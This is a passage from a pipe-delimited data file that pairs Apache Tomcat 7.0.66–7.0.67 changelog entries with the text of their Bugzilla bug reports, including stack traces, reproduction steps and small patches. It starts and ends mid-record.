* STATE: DO => DO_DONE handle 0x6000572f0; line 1337 (connection #0)
* STATE: DO_DONE => WAITPERFORM handle 0x6000572f0; line 1464 (connection #0)
* STATE: WAITPERFORM => PERFORM handle 0x6000572f0; line 1474 (connection #0)
* HTTP 1.1 or later with persistent connection, pipelining supported
< HTTP/1.1 200 OK
* Server Apache-Coyote/1.1 is not blacklisted
< Server: Apache-Coyote/1.1
< Accept-Ranges: bytes
< ETag: W/""1156-1448007578000""
< Last-Modified: Fri, 20 Nov 2015 08:19:38 GMT
< Content-Type: text/html
< Content-Length: 1156
< Date: Fri, 27 Nov 2015 08:36:38 GMT
<
{ [1156 bytes data]
* STATE: PERFORM => DONE handle 0x6000572f0; line 1632 (connection #0)
* Curl_done
* Connection #0 to host localhost left intact

Cheers, 
Per Lewau"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58660
Catalina|Tomcat 7.0.67 (violetagg)|fix||Fixed potential NPE in HostConfig while deploying an application. Issue reported by coverity scan. (violetagg)|||
Catalina|Tomcat 7.0.67 (violetagg)|fix|58655|Fix an IllegalStateException when calling HttpServletResponse.sendRedirect() with the RemoteIpFilter. This was caused by trying to correctly generate the absolute URI for the redirect. With the fix for 56917, redirects may now be relative making the sendRedirect() implementation for the RemoteIpFilter much simpler. This also addresses issues where the redirect may not have behaved as expected when redirecting from http to https to from https to http. (markt)|IllegalStateException: calling HttpServletResponse#sendRedirect() with RemoteIpFilter|"Created attachment 33299 [details]
stacktrace of error

When calling `HttpServletResponse#sendRedirect()`, if `RemoteIpFilter` is in use, an `IllegalStateException` is thrown (see attached stack-trace). 

The error steams from the way `RemoteIpFilter.XForwardedResponse` tries to rewrite the 'Location' header. According to the servlet API, a response is considered committed after calling `sendRequest()` and it is illegal to call either `reset()` or another `sendRequest()` thereafter.

WORKAROUND:

Comment the code after `super.sendRedirect(location);`. However, this effectively disables the `RemoteIpFilter` on the response path and makes the server return an URL with incorrect scheme.

[1] https://github.com/apache/tomcat/blob/trunk/java/org/apache/catalina/filters/RemoteIpFilter.java#L679

[2] https://tomcat.apache.org/tomcat-8.0-doc/servletapi/index.html"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58655
WebSocket|Tomcat 7.0.67 (violetagg)|fix|58658|Correct a regression in 7.0.66 that prevented Tomcat from starting on Java 6 unless the WebSocket JARs (that require Java 7) were removed. (markt)|"7.0.66 running with Java 6 fails unless unneeded ""tomcat7-websocket.jar"" is removed from lib/"|"Running 7.0.66 release candidate (smoke-testing) I see an issue that I think is caused by r1715984 change in build.xml:

-           source=""${compile.source}""
-           target=""${compile.target}""
+           source=""1.7""
+           target=""1.7""

To reproduce:
1. Unpack apache-tomcat-7.0.66.zip
2. Set JAVA_HOME = Java 6
3. Start Tomcat
4. Deployment of every web application fails, including the ROOT one.


INFO: Deploying web application directory REDACTED\apache-tomcat-7.0.66\webapps\ROOT
26.11.2015 18:54:53 org.apache.catalina.core.ContainerBase addChildInternal
SEVERE: ContainerBase.addChild: start:
org.apache.catalina.LifecycleException: Failed to start component [StandardEngine[Catalina].StandardHost[localhost].StandardContext[]]
    at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:154)
    at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:901)
    at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:877)
    at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:652)
    at org.apache.catalina.startup.HostConfig.deployDirectory(HostConfig.java:1263)
    at org.apache.catalina.startup.HostConfig$DeployDirectory.run(HostConfig.java:1975)
    at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:439)
    at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:303)
    at java.util.concurrent.FutureTask.run(FutureTask.java:138)
    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:895)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:918)
    at java.lang.Thread.run(Thread.java:662)
Caused by: java.lang.UnsupportedClassVersionError: org/apache/tomcat/websocket/server/WsSci : Unsupported major.minor version 51.0
    at java.lang.ClassLoader.defineClass1(Native Method)
    at java.lang.ClassLoader.defineClassCond(ClassLoader.java:631)
    at java.lang.ClassLoader.defineClass(ClassLoader.java:615)
    at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:141)
    at java.net.URLClassLoader.defineClass(URLClassLoader.java:283)
    at java.net.URLClassLoader.access$000(URLClassLoader.java:58)
    at java.net.URLClassLoader$1.run(URLClassLoader.java:197)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.net.URLClassLoader.findClass(URLClassLoader.java:190)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:306)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:247)
    at java.lang.Class.forName0(Native Method)
    at java.lang.Class.forName(Class.java:249)
    at org.apache.catalina.loader.WebappClassLoaderBase.loadClass(WebappClassLoaderBase.java:1842)
    at org.apache.catalina.loader.WebappClassLoaderBase.loadClass(WebappClassLoaderBase.java:1705)
    at java.lang.Class.forName0(Native Method)
    at java.lang.Class.forName(Class.java:249)
    at org.apache.catalina.startup.WebappServiceLoader.loadServices(WebappServiceLoader.java:192)
    at org.apache.catalina.startup.WebappServiceLoader.load(WebappServiceLoader.java:157)
    at org.apache.catalina.startup.ContextConfig.processServletContainerInitializers(ContextConfig.java:1577)
    at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1281)
    at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:889)
    at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:386)
    at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:117)
    at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
    at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5460)
    at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
    ... 11 more
]]]

Solution
---------
The workaround is to remove the following two files from lib directory:
tomcat7-websocket.jar
websocket-api.jar

I guess that removing tomcat7-websocket.jar alone is enough, but I only tested with removing both of them.

It is known that websocket API (JSR356) requires Java 7, so there is no use for those jar files when running with Java 6.

Good news:
1. The examples web app runs successfully without those files. (I feared that it won't start).
2. JSR356 examples successfully show their HTML pages. Attempting to open a websocket connection fails immediately, as expected.

Thoughts
---------
1. Starting Tomcat 7.0.65 with Java 6 logs a nice warning:

26.11.2015 19:12:19 org.apache.tomcat.websocket.server.WsSci onStartup
INFO: JSR 356 WebSocket (Java WebSocket 1.1) support is not available
when running on Java 6. To suppress this message, run Tomcat on Java 7,
remove the WebSocket JARs from $CATALINA_HOME/lib or add the WebSocket JARs
to the tomcat.util.scan.DefaultJarScanner.jarsToSkip property in
$CATALINA_BASE/conf/catalina.properties. Note that the deprecated Tomcat 7
WebSocket API will be available. 

The above warning message is no longer written by 7.0.66. Tomcat 7.0.66 just fails.

2. An update to installation instructions (RUNNING.txt) is needed.

Currently it says to unpack the binary archive, but with Java 6 that is no longer enough.

3. An update to Windows installer is needed.

If I remember correctly, there is no option to omit those jar files when installing Tomcat."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58658
Web Applications|Tomcat 7.0.67 (violetagg)|add||Add a description of the default value of heartbeatSleeptime attribute and optionCheck attribute in the cluster channel docs. (kfujino)|||
Tribes|Tomcat 7.0.67 (violetagg)|fix||Fix potential NPE in AbstractReplicatedMap.breakdown(). (kfujino)|||
General|Tomcat 7.0.66 (violetagg)|update|58596|Clarify the description in RUNNING.txt of how environment variables are used. (markt)|Add Patch Binary -- Running.txt says tomcat is a JAVA application and doesn't use Environment Variables.|"Created attachment 33264 [details]
patch for RUNNING.txt

Running.txt(which helps user to guide for running up tomcat) says tomcat is a JAVA application and doesn't use Environment Variables.

Tomcat always uses CATALINA_HOME as a environment variable.
No matter who is setting this, either explicit or implicit by start up script.
The document says, since it is a JAVA application, it does not use, but JAVA application does use.
And the next few lines are also misleading according to Bug statement CATALINA_HOME(required).
So it seems misleading.

Providing a patch for this."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58596
Catalina|Tomcat 7.0.66 (violetagg)|fix|34319|Only load those keys in StoreBase.processExpire from JDBCStore, that are old enough, to be expired. Based on a patch by Tom Anderson. (fschumacher)|StoreBase.processExpires() is very inefficient|"Using a session store such as JDBCStore with the default configuration 
(Engine.backgroundProcessorDelay=10 and StandardManager.processExpiresFrequency=6), 
StoreBase.processExpires() will wake up once a minute and load all stored sessions into memory.   So, 
with the default 30-minute session-timeout setting, this means we are loading up to 29 minutes worth 
of sessions that won't be ready to expire.   In this example we load 30x more sessions than we actually 
need to. 

Since the purpose of StoreBase.processExpires() is to find sessions that are ready to be expired, it 
doesn't make sense to load ALL session for cases where we could pre-filter sessions BEFORE loading 
them.   For example, JDBCStore could use a where clause to reduce the number of sessions loaded as 
candidates to be expired and FileStore could query the filesystem for the age of the files before loading.    
The current behavior could be the worst-case fallback for Stores in which it is not possible to get age 
information.

I propose that StoreBase.processExpires() be refactored to load only keys of old sessions when possible 
by providing an oldKeys() method that may be overriden.   By default this would just return all keys but 
it should be easy to extend this in specialized versions (I will provide a sample patch to illustrate for 
JDBCStore)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=34319
Catalina|Tomcat 7.0.66 (violetagg)|fix|56777|Allow file based configuration resources (user database, certificate revocation lists, keystores and trust stores) to be configured using URLs as well as files. Back-port provided by Huxing Zhang. (markt/violetagg)|Allow configuration resources to be loaded from places other than straight off the filesystem|"We're using embedded Tomcat in Spring Boot (https://github.com/spring-projects/spring-boot). Spring Boot allows a user to create an executable jar file that contains Tomcat and their application. The idea is that an application can, if so desired, be entirely contained within the jar with no external dependencies.

Currently, this breaks down if a key store or trust store is required for SSL configuration as Tomcat requires them to be readable directly from the filesystem rather than from within a jar file. I'd like to propose an enhancement to Tomcat that introduces a resource abstraction, allowing configuration resources to be loaded from within an archive and perhaps even broader than that. (Jetty, for example, allows a resource to be loaded from a URL)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56777
Catalina|Tomcat 7.0.66 (violetagg)|add|57741|Enable the CGI servlet to use the standard error page mechanism. Note that if the CGI servlet's debug init parameter is set to 10 or higher then the standard error page mechanism will be bypassed and a debug response generated by the CGI servlet will be returned instead. (markt)|Add support for error-pages to CGIServlet|"Created attachment 32591 [details]
Patch for applying the enchancement described in the report. Adds a new init-param to the servlet configuration which will be used to trigger the error-page mechanism.

A configuration parameter has been added to the CGIServlet to allow use of the error-page mechanism. Default configuration will maintain current functionality.

Currently, when the debug logging level is too low and there is an error executing the CGI script, a blank page is returned even if the corresponding error-page is configured correctly. This causes inconsistency with custom error-pages."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57741
Catalina|Tomcat 7.0.66 (violetagg)|add|58486|Protect against two further possible memory leaks associated with XML parsing. (markt)|JreMemoryLeakPreventionListener: initialize two further JRE classes|"I would like to propose adding a further couple of classes to those that Tomcat's JreMemoryLeakPreventionListener statically initializes.

The classes com.sun.org.apache.xerces.internal.dom.DOMNormalizer and com.sun.org.apache.xml.internal.serialize.DOMSerializerImpl, both within rt.jar, each contain a static final field of type RuntimeException named 'abort'.  When these classes are statically initialized, these exceptions are created and their stacktraces filled in.  If a web app class happens to be in the call stack when either class's exception is created, this class cannot then be garbage collected when the web app is stopped because an exception in a static field of a class has a reference to it.  This then causes a PermGen leak as the web apps's classloader, and all of the classes it loaded, cannot be garbage-collected.

To reproduce this issue, use the following servlet class:

package com.example;

import javax.servlet.ServletException;
import javax.servlet.http.*;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;
import org.w3c.dom.ls.DOMImplementationLS;

public class DOMNormalizerLeakServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException {
        try {
            Document document = DocumentBuilderFactory.newInstance().newDocumentBuilder().newDocument();
            document.createElement(""test"");
            DOMImplementationLS implementation = (DOMImplementationLS)document.getImplementation();
            implementation.createLSSerializer().writeToString(document);
            response.getWriter().write(""done"");
        }
        catch (Exception e) {
            throw new ServletException(e);
        }
    }
}

and the following web.xml file:

<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
	 xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
	 xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd""
	 version=""3.1"">
    <servlet>
        <servlet-name>test</servlet-name>
        <servlet-class>com.example.DOMNormalizerLeakServlet</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>test</servlet-name>
        <url-pattern>/index.html</url-pattern>
    </servlet-mapping>   
</web-app>

I've reproduced this problem with the latest Tomcat (8.0.27) and the latest Oracle JDK8 (1.8.0_60), by:

* deploying a web app consisting of the above servlet class and deployment descriptor to Tomcat,
* viewing the index.html page generated by Tomcat (the browser should show the word 'done'),
* reloading the web app using the Tomcat manager app,
* clicking the 'Find leaks' button in the Diagnostics section of the manager app, which reveals a possible memory leak,
* using a profiler such as JVisualVM to confirm that Tomcat now has a 'destroyed' classloader that could not be garbage collected because there is a chain of references from a JRE class to the servlet class it loaded.

Here's a path from the classloader to the exception, which I obtained with the help of JVisualVM:

this     - value: org.apache.catalina.loader.WebappClassLoader #3
 <- <classLoader>     - class: com.example.DOMNormalizerLeakServlet, value: org.apache.catalina.loader.WebappClassLoader #3
  <- [2]     - class: java.lang.Object[], value: com.example.DOMNormalizerLeakServlet class DOMNormalizerLeakServlet
   <- [2]     - class: java.lang.Object[], value: java.lang.Object[] #4319
    <- backtrace     - class: java.lang.RuntimeException, value: java.lang.Object[] #4318
     <- abort (sticky class)     - class: com.sun.org.apache.xml.internal.serialize.DOMSerializerImpl, value: java.lang.RuntimeException #1

There is a straightforward workaround for this: add the names of these two classes to the classesToInitialize attribute for the JreMemoryLeakPreventionListener.  This then causes the classes to be statically initialized by Tomcat itself and keeps web app classes out of the stacktrace of these exceptions.

I have filed a bug report with Oracle to change the behaviour of these two classes.  However, until this gets fixed (if it gets fixed at all), it would be appreciated if the JreMemoryLeakPreventionListener could be adapted to handle these two classes."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58486
Catalina|Tomcat 7.0.66 (violetagg)|code|58497|Make AbstractHttp11Processor easy to extend. (markt)|Unable to have a custom implementation of AbstractHttp11Processor due to package private methods|"http://grepcode.com/file/repo1.maven.org/maven2/org.apache.tomcat/tomcat-coyote/7.0.54/org/apache/coyote/http11/AbstractHttp11Processor.java#AbstractHttp11Processor

Class org.apache.coyote.http11.AbstractHttp11Processor is marked as a ""public abstract"" class. However:

 abstract boolean  [More ...] prepareSendfile(OutputFilter[] outputFilters);

The above method ""prepareSendfile"" is not marked as public ( i.e. made a package private) and thus cannot be overridden from an extending class which is outside of the ""org.apache.coyote.http11"" package.

Same can be said for :   ""abstract void  actionInternal(ActionCode actionCode, Object param)"" method as well.

We have a requirement of having a custom implementation for AbstractHttp11Processor but now we cannot because these methods cannot be overridden unless we modify in the tomcat source code. Thus this is proving a blocker for us.

Is there any specific reason these were made ""package private"" because the class itself is abstract & public ? 

Am not too sure but this might be applicable to latest tomcat (e.g.8 ) versions too."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58497
Catalina|Tomcat 7.0.66 (violetagg)|fix|58508|Escape role names when generating associated MBeans in case the role name contains characters not permitted in an MBean name. (markt)|role_name in tomcat-users.xml : invalid character|"Bonjour, 

My tomcat server send exception about invalid characters with a role name ""ubx:5485"" ;

My first question is : why ? ;o)

and I would like find specifications about valid characters for a role name.

do you have some solution , because I used Ldap connection, and all my groups are this format ""xx:yyy:zzz"" .

Thanks a lot , 
Frederic (de Bordeaux : soleil et froid )"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58508
Catalina|Tomcat 7.0.66 (violetagg)|fix|58522|Fixed concurrency issue when iterating web application's resources. (violetagg)|concurrency problem corrupts WARDirContext.Entry children|"We discovered a problem where calling ServletContext.getResourcePaths from a jsp may corrupt WARDirContext.Entry.children. The WARDirContext.list(Entry) method performs an Arrays.sort(children) call which is not thread-safe. Calling this from multiple request threads may result in the children array losing some entries and duplicating others.

When entries representing directories in the war are lost, Tomcat cannot load resources from there. Static resource requests result in http error code 404 and jsp compliation can throw JasperException when included files are not found.

We have seen this on CentOS 6.5 (and newer versions) with Tomcat 7.0.52 and Java 1.7.0_51.

The following are attached in the zip:
* Test case project which demonstrates this corruption. It usually requires multiple runs.
* A stack trace illustrating the problematic flow.
* A patch file for WARDirContext.java."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58522
Catalina|Tomcat 7.0.66 (violetagg)|fix|58534|Removed repeated conditional tests in o.a.tomcat.websocket.pojo.PojoMethodMapping and o.a.tomcat.util.net.AprEndpoint Patch provided by Anthony Whitford. (violetagg)|Repeated Conditional Test|"In org.apache.tomcat.websocket.pojo.PojoMethodMapping, there are cases like this:

    if (currentClazz == clazzPojo ||
        (currentClazz != clazzPojo && !isMethodOverride(open, method))) {


The clause 'currentClazz != clazzPojo' is redundant since we know 'currentClazz == clazzPojo' is false.


This is repeated several times."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58534
Catalina|Tomcat 7.0.66 (violetagg)|fix|58535|Use Collections.reverseOrder when a reverse ordering is needed. (violetagg)|ReverseComparator unsafely negates result|"Created attachment 33210 [details]
Patch to avoid negation risk

Consider the code:

    @Override
    public int compare(Session o1, Session o2) {
        int returnValue = comparator.compare(o1, o2);
        return (- returnValue);
    }

This code negates the return value of the compare method. This is a questionable or bad programming practice, since if the return value is Integer.MIN_VALUE, negating the return value won't negate the sign of the result. You can achieve the same intended result by reversing the order of the operands rather than by negating the results.

See http://findbugs.sourceforge.net/bugDescriptions.html#RV_NEGATING_RESULT_OF_COMPARETO

Recommend the following:

    @Override
    public int compare(Session o1, Session o2) {
        // Note that comparing o2 with o1 to get reverse result...
        return comparator.compare(o2, o1);
    }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58535
Catalina|Tomcat 7.0.66 (violetagg)|fix|58537|Some of the inner classes in o.a.catalina.valves.ExtendedAccessLogValve are made static. Patch provided by Anthony Whitford. (violetagg)|ExtendedAccessLogValve inner AccessLogElement classes can be static|"Created attachment 33211 [details]
Add the static keyword to the inner AccessLogElement classes

There are several inner classes defined that subclass AccessLogElement that are not defined as static.

Since the inner classes do not use its embedded reference to the object which created it, the class may be made static to avoid keeping the reference to the creator object alive longer than necessary, and keeping the class instances lean.

See  http://findbugs.sourceforge.net/bugDescriptions.html#SIC_INNER_SHOULD_BE_STATIC"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58537
Catalina|Tomcat 7.0.66 (violetagg)|fix|58540|Removed unused code from o.a.catalina.connector.Request. Patch provided by Anthony Whitford. (violetagg)|Request setCharacterEncoding has unused code|"Created attachment 33212 [details]
This patch removes the unused buffer.

The 'buffer' variable is unused and can be removed.  (I suspect it is a remnant of some past code.) 


    @Override
    public void setCharacterEncoding(String enc)
        throws UnsupportedEncodingException {

        if (usingReader) {
            return;
        }

        // Ensure that the specified encoding is valid
        byte buffer[] = new byte[1];
        buffer[0] = (byte) 'a';

        // Confirm that the encoding name is valid
        B2CConverter.getCharset(enc);

        // Save the validated encoding
        coyoteRequest.setCharacterEncoding(enc);
    }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58540
Catalina|Tomcat 7.0.66 (violetagg)|fix||58541, 58544: It is more efficient to call Integer.toString(int) instead of Integer.valueOf(int).toString() when only a string representation of a primitive is needed. Based on a patch provided by Anthony Whitford. (violetagg)|CGIServlet and WebdavServlet code improvements|"Created attachment 33213 [details]
Code improvements to two Servlet classes

Noticed some opportunities:

'String.indexOf(char)' is faster than 'String.indexOf(string)'
'Integer.parseInt(s)' is more efficient than 'new Integer(s).intValue()'
'Integer.valueOf(i)' may be more efficient than 'new Integer(i)'
'Integer.toString(i)' is more efficient than 'Integer.valueOf(i).toString()'"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58541
Catalina|Tomcat 7.0.66 (violetagg)|fix||58541, 58547: It is more efficient to call valueOf(...) instead of Number constructor. Based on a patch provided by Anthony Whitford. (violetagg)|CGIServlet and WebdavServlet code improvements|"Created attachment 33213 [details]
Code improvements to two Servlet classes

Noticed some opportunities:

'String.indexOf(char)' is faster than 'String.indexOf(string)'
'Integer.parseInt(s)' is more efficient than 'new Integer(s).intValue()'
'Integer.valueOf(i)' may be more efficient than 'new Integer(i)'
'Integer.toString(i)' is more efficient than 'Integer.valueOf(i).toString()'"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58541
Catalina|Tomcat 7.0.66 (violetagg)|fix|58545|In some use cases it is more efficient to use Map.entrySet() instead of Map.keySet() Based on a patch provided by Anthony Whitford. (violetagg)|WsHandshakeRequest inefficient use of keySet|"Created attachment 33217 [details]
Replaces inefficient use of keySet() with more efficient entrySet()

In WsHandshakeRequest...

        for (String pathName : pathParams.keySet()) {
            newParameters.put(pathName,
                    Collections.unmodifiableList(
                            Arrays.asList(pathParams.get(pathName))));
        }


should be:

        for (Entry<String,String> entry : pathParams.entrySet()) {
            final String pathName = entry.getKey();
            newParameters.put(pathName,
                    Collections.unmodifiableList(
                            Arrays.asList(entry.getValue())));
        }

to avoid the extra lookup.

See http://findbugs.sourceforge.net/bugDescriptions.html#WMI_WRONG_MAP_ITERATOR"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58545
Catalina|Tomcat 7.0.66 (violetagg)|add||Add a new RestCsrfPreventionFilter that provides basic CSRF protection for REST APIs. (violetagg)|||
Catalina|Tomcat 7.0.66 (violetagg)|fix|58581|If a custom error page fails, fall back to the standard error page rather than throwing an NPE. Based on a patch by Huxing Zhang. (markt)|StandardHostValve#custom throws NPE if custom error page is incorrectly configured|"Created attachment 33255 [details]
proposed fix to avoid NPE

Minimal files to reproduce this issue:
1) create a directory named test and deploy it under webapps
test
‚îú‚îÄ‚îÄ WEB-INF
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ web.xml
‚îú‚îÄ‚îÄ error.html
‚îî‚îÄ‚îÄ test.html

the web.xml is as follows:

<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app version=""3.0"">
    <servlet-mapping>
        <servlet-name>default</servlet-name>
        <url-pattern>/test.html</url-pattern>
    </servlet-mapping>

    <error-page>
        <error-code>404</error-code>
        <location>/error.html</location>
    </error-page>
</web-app>
2 ) start tomcat and visit http://localhost:8080/test/abc.html

The exception is thrown as follows:

04-Nov-2015 22:24:04.984 SEVERE [http-nio-8080-exec-1] org.apache.catalina.core.StandardHostValve.custom Exception Processing                      ErrorPage[errorCode=404, location=/error.html]
 java.lang.NullPointerException
    at org.apache.catalina.core.StandardHostValve.custom(StandardHostValve.java:391)
    at org.apache.catalina.core.StandardHostValve.status(StandardHostValve.java:257)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:180)
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:79)
    at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:616)
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:361)
    at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:1057)
    at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:75)
    at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:737)
    at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1531)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
    at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
    at java.lang.Thread.run(Thread.java:745)

The exception is not user-friendly, and somehow misleading. From the stack trace, user is likely to consider it as a tomcat bug. 

The solution might be adding url-pattern /error.html to the default servlet, or just change the url-pattern to match all the html resources.

My suggestion is to avoid such NPE and tell user what to do.

I have attached a proposed fix against trunk."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58581
Catalina|Tomcat 7.0.66 (violetagg)|fix|58582|Combined realm should perform background processing on its sub-realms. Based upon a patch provided by Aidan. (kkolinko)|org.apache.catalina.realm.CombinedRealm should implement backgroundProcess|"org.apache.catalina.realm.CombinedRealm should implement backgroundProcess() by calling this method on each of the Realms it manages e.g.

    @Override
    public void backgroundProcess()
    {
        for( Realm r: realms )
            r.backgroundProcess();

        // for Tomcat9 ;-)
        // realms.forEach( r -> r.backgroundProcess() );
    }

Without this, the backgroundProcess() of a Realm that is wrapped by CombinedRealm or LockOutRealm (which extends CombinedRealm) is not called.


Aidan."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58582
Catalina|Tomcat 7.0.66 (violetagg)|fix||Handle the unlikely case where different versions of a web application are deployed with different session settings. (markt)|||
Catalina|Tomcat 7.0.66 (violetagg)|add||Add a new Context option, enabled by default, that enables an additional check that a client provided session ID is in use in at least one other web application before allowing it to be used as the ID for a new session in the current web application. (markt)|||
Catalina|Tomcat 7.0.66 (violetagg)|add||Add support for DIGEST authentication to the JNDIRealm. Based on a patch by Alexis Hassler. (markt)|||
Catalina|Tomcat 7.0.66 (violetagg)|fix|58603|Ensure that HttpServletRequest.getRequestURL() returns the correct value when using the RemoteIpFilter. (markt)|RemoteIpFilter does not adjust getRequestURL()|"Created attachment 33272 [details]
Details for how to reproduce the bug

When putting an HTTP server behind a forwarder -- such as nginx or Amazon CloudFront -- special HTTP headers are sent -- such as X-Forwarded-Proto and X-Forwarded-For -- to allow the server to reconstruct the URL that the client used for making the request. This is important, for example, to construct a meaningful ""Location"" HTTP response header.

The purpose of the RemoteIpFilter is to give servlets the impression that they are operating on the original, pre-forwarded request. Hence, without changing any line of code, the existing servlets can construct meaningful URL for the client.

Unfortunately, the wrapped request that RemoteIpFilter produces does not correctly implement getRequestURL(). In fact, it simply forwards this call to the wrapped request, which contains non-meaningful information about e.g., the HTTP schema [1][2]. This currently breaks Jetty, which relies on getRequestURL to construct a correct ""Location"" header [3]. (See attachment for details on how to reproduce the bug.)

I'm not sure what the best technical solution would be. Should RemoteIpFilter.XForwardedRequest implement its own getRequestURL? I haven't found an implementation for it. Could somebody point me to it?

[1] http://grepcode.com/file/repo1.maven.org/maven2/org.apache.tomcat/tomcat-catalina/8.0.24/org/apache/catalina/filters/RemoteIpFilter.java#444
[2] http://grepcode.com/file/repo1.maven.org/maven2/org.apache.tomcat/tomcat-servlet-api/8.0.24/javax/servlet/http/HttpServletRequestWrapper.java#212
[3] http://grepcode.com/file/repo1.maven.org/maven2/org.glassfish.jersey.containers/jersey-container-servlet-core/2.19/org/glassfish/jersey/servlet/ServletContainer.java#253"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58603
Catalina|Tomcat 7.0.66 (violetagg)|fix||Ensure that in an embedded Tomcat the logging configuration is not lost during garbage collection. (violetagg)|||
Catalina|Tomcat 7.0.66 (violetagg)|add||Move the functionality that provides redirects for context roots and directories where a trailing / is added from the Mapper to the DefaultServlet. This enables such requests to be processed by any configured Valves and Filters before the redirect is made. This behaviour is configurable via the mapperContextRootRedirectEnabled and mapperDirectoryRedirectEnabled attributes of the Context which may be used to restore the previous behaviour. (markt)|||
Catalina|Tomcat 7.0.66 (violetagg)|fix|58635|Enable break points to be set within agent code when running Tomcat with a Java agent. Based on a patch by Huxing Zhang. (markt)|Break point at java agent code is ignored during catalina.sh jpda run|"Steps to reproduce this issue:
1. prepare a simple java agent, named TestJavaAgent
2. add a break point to the premain method of TestJavaAgent
3. modify bin/setenv.sh:
export JPDA_SUSPEND=y
export CATALINA_OPTS=""$CATALINA_OPTS -javaagent:/path/to/test/java/agent.jar""
4. start tomcat in debugging mode: 
bin/catalina.sh jpda run 

Expected behavior:
The tomcat prompts ""Listening for transport dt_socket at address: 8000"", and when attach a debugger to port 8000, the process stops at the break point in premain method of TestJavaAgent

Actual behavior:
The premain method of TestJavaAgent has been executed, and then tomcat prompts ""Listening for transport dt_socket at address: 8000"", the process never stopped at the break point in premain method of TestJavaAgent

Putting $JPDA_OPTS before $CATALINA_OPTS will solve this issue:

Index: bin/catalina.sh
===================================================================
--- bin/catalina.sh	(revision 1715719)
+++ bin/catalina.sh	(working copy)
@@ -279,7 +279,7 @@
   if [ -z ""$JPDA_OPTS"" ]; then
     JPDA_OPTS=""-agentlib:jdwp=transport=$JPDA_TRANSPORT,address=$JPDA_ADDRESS,server=y,suspend=$JPDA_SUSPEND""
   fi
-  CATALINA_OPTS=""$CATALINA_OPTS $JPDA_OPTS""
+  CATALINA_OPTS=""$JPDA_OPTS $CATALINA_OPTS""
   shift
 fi

Note: setting -agentlib=/path/to/agent.jar to JAVA_OPTS won't fix this issue, neither. Because JAVA_OPTS always goes before CATALINA_OPTS."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58635
Catalina|Tomcat 7.0.66 (violetagg)|fix||Add path parameter handling to HttpServletRequest.getContextPath(). This is a follow-up to the fix for 57215. (markt)|Regression in Tomcat 7.0.54 after Bug 56501 with urls starting with //|"After upgrading from 7.0.52 of Tomcat to 7.0.54 we found that our application was now returning 404 resource not found errors when the request uri starts with //.
eg. We have an embedded server created and started something like:

 org.apache.catalina.startup.Embedded embedded = new Embedded();
 org.apache.catalina.Engine engine engine = embedded.createEngine();
 engine.setName("""");
 embedded.setContainer(engine);
 embedded.addEngine(engine);

 ...

 String startPathContextRoot = ""c:\website\data\startPath"";
